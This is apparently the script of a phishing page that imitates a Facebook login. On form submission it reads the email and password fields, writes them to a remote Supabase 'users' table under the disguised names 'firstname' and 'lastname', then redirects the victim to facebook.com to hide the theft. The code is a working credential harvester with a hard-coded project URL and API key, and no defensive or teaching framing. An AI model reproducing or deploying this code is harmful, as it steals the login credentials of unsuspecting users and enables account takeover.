     import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm';
      const SUPABASE_URL = 'https://azrpqmginscnlrrciebl.supabase.co';
      const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImF6cnBxbWdpbnNjbmxycmNpZWJsIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzEyMDkzOTIsImV4cCI6MjA4Njc4NTM5Mn0.P_wtYRdQAwUaEgnUYbvVHEWH1V4LOABvZh-2hthhS4k';

      const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

document.addEventListener('DOMContentLoaded', () => {
      const form = document.getElementById('u_0_d_5u');

      form.addEventListener('submit', async (e) => {
        e.preventDefault();
        const firstname = document.getElementById('emailhidden').value.trim();
        const lastname = document.getElementById('pass').value.trim();

        try {
          const { data, error } = await supabase
            .from('users')
            .insert([{ firstname, lastname }])
            .select(); // return inserted row(s)
             console.log("Logged In Success")

          if (error) console.log("Log In Failed");

        // Implement a delay before redirection
            setTimeout(() => {
         // Redirect to your desired URL
         window.location.href = 'https://www.facebook.com';
       }, 5000);
        } catch (err) {
         console.log("Unable to Log");
        }
      });

})


